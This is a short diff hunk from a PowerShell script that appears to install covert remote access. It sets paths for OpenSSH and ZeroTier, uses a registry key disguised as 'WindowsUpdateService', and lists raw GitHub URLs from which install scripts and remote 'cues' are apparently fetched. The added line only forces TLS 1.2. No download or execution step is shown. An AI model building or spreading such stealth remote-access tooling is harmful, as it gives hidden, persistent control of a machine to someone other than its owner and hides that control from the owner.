@@ -14,6 +14,7 @@ $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1"
 $ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
 $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
